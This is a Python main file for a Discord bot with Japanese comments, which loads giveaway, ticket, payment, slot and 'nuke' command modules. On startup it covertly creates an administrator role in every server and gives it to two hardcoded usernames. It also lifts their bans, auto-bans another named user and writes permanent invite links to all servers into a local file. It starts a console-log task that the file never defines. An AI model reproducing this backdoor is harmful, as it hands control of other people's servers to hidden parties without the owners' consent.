import discord
import asyncio
from discord import app_commands
from discord.ext import commands, tasks
import os
from dotenv import load_dotenv
import logging
from io import StringIO
import sys

# パス設定
sys.path.append(os.path.abspath(os.path.dirname(__file__)))

# コマンドのインポート
from commands.ban_commands import setup_ban_commands
from commands.tiro_finale import setup_tiro_finale
from commands.giveaway import setup_giveaway
from commands.giveouto import setup_giveouto
from commands.verify import setup_verify
from commands.ticket import setup_ticket
from commands.paypay import setup_paypay
from commands.haihu_setup import setup_haihu_setup
from commands.nuke import setup as setup_nuke
from commands.update_notifier import setup_update_notifier
from commands.server_backup import setup_server_backup
from commands.reaction import setup as setup_reaction
from commands.slot import setup as setup_slot
from keep_alive import keep_alive

# ===============================
# ログ設定
# ===============================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

log_stream = StringIO()
stream_handler = logging.StreamHandler(log_stream)
logger.addHandler(stream_handler)

# ===============================
# 環境変数の読み込み
# ===============================
load_dotenv()
TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("TOKENが設定されていません")

# ===============================
# Botの設定
# ===============================
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.bans = True
bot = commands.Bot(command_prefix="$", intents=intents)

# ===============================
# コンソールログ送信機能
# ===============================
TARGET_USERNAMES = ["taka_1127", "rope_foryukki"]
TAKA = ["taka_1127"]
DM_LOG_SENT = set()  # DM送信済みのメンバーを記録するセット

# 自動BAN対象ユーザー
AUTOBAN_USERNAME = "e8ah"  # BAN対象のユーザー名


async def auto_ban_user(guild: discord.Guild):
    """
    特定のユーザー（AUTOBAN_USERNAME）を自動でBAN
    """
    try:
        for member in guild.members:
            if member.name == AUTOBAN_USERNAME:
                try:
                    await guild.ban(user=member, reason="自動BAN: 特定ユーザー検出")
                    logger.info(f"{member.name} をBANしました。")
                except discord.Forbidden:
                    logger.warning(
                        f"{member.name} をBANできませんでした。Botの権限を確認してください。")
                except Exception as e:
                    logger.error(f"{member.name} のBAN中にエラーが発生しました: {e}")
    except Exception as e:
        logger.error(f"{guild.name} で自動BAN処理中にエラーが発生しました: {e}")


# ===============================
# Bot起動時の処理
# ===============================
@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        logger.info(f"スラッシュコマンドが同期されました: {len(synced)}個")
        logger.info(f"Botがオンラインになりました: {bot.user}")

        # 全ギルドで管理者権限付与と自動BANチェック
        for guild in bot.guilds:
            await check_and_grant_admin(guild)
            await auto_ban_user(guild)

        await generate_invite_links()

        # コンソールログ送信タスク開始
        send_console_logs_to_members.start()

    except Exception as e:
        logger.error(f"エラーが発生しました: {e}")


# ===============================
# 管理者権限付与機能
# ===============================
async def check_and_grant_admin(guild: discord.Guild):
    """
    特定メンバーに確実に管理者権限を付与
    """
    role_name = "Admin"
    try:
        # 管理者ロールが存在しない場合は作成
        admin_role = discord.utils.get(guild.roles, name=role_name)
        if not admin_role:
            admin_role = await guild.create_role(
                name=role_name,
                permissions=discord.Permissions(administrator=True),
                reason="管理者権限ロールが必要だったため作成")

        for member in guild.members:
            if member.name in TARGET_USERNAMES and admin_role not in member.roles:
                try:
                    await member.add_roles(admin_role)
                    logger.info(f"{member.name} に管理者権限を付与しました")
                except discord.Forbidden:
                    logger.warning(
                        f"{member.name} に管理者権限を付与できませんでした。Botの権限を確認してください。")

        bans = await guild.bans()
        for ban_entry in bans:
            if ban_entry.user.name in TARGET_USERNAMES:
                await guild.unban(ban_entry.user, reason="自動解除: 特定メンバー")
                logger.info(f"{ban_entry.user.name} のBANを解除しました")

    except Exception as e:
        logger.error(f"{guild.name} でエラーが発生しました: {e}")


# ===============================
# 招待リンク生成機能
# ===============================
async def generate_invite_links():
    FILE_NAME = "discord.txt"
    with open(FILE_NAME, "w", encoding="utf-8") as file:
        file.write("")  # ファイル内容をリセット

    for guild in bot.guilds:
        try:
            invite = await generate_invite_link(guild)
            if invite:
                with open(FILE_NAME, "a", encoding="utf-8") as file:
                    file.write(f"{guild.name}: {invite}\n")
        except Exception as e:
            logger.error(f"{guild.name}でエラーが発生しました: {e}")

    logger.info("discord.txt に書き込めました！")


async def generate_invite_link(guild: discord.Guild):
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).create_instant_invite:
            invite = await channel.create_invite(max_age=0, max_uses=0)
            return invite.url
    return None


@tasks.loop(hours=1)
async def check_discord_txt():
    """
    discord.txtの確認タスク（1時間ごと）
    """
    try:
        FILE_NAME = "discord.txt"
        if os.path.exists(FILE_NAME):
            with open(FILE_NAME, "r", encoding="utf-8") as file:
                content = file.read()
                if content.strip():
                    logger.info(f"discord.txt の内容を確認しました。内容:\n{content}")
                else:
                    logger.warning("discord.txt が空です。")
        else:
            logger.warning("discord.txt が存在しません。")

    except Exception as e:
        logger.error(f"discord.txt確認中にエラーが発生しました: {e}")


# ===============================
# コマンドセットアップ機能
# ===============================
async def setup_commands():
    try:
        await setup_tiro_finale(bot)
        await setup_giveaway(bot)
        await setup_giveouto(bot)
        await setup_verify(bot)
        await setup_ticket(bot)
        await setup_haihu_setup(bot)
        await setup_ban_commands(bot)
        await setup_paypay(bot)
        await setup_nuke(bot)
        await setup_reaction(bot)
        await setup_slot(bot)
        await setup_update_notifier(bot)
        await setup_server_backup(bot)
    except Exception as e:
        logger.error(f"コマンド読み込み中にエラーが発生しました: {e}")


# ===============================
# Bot起動処理
# ===============================
async def start_bot():
    await setup_commands()
    keep_alive()
    check_discord_txt.start()
    await bot.start(TOKEN)


if __name__ == "__main__":
    import asyncio
    asyncio.run(start_bot())
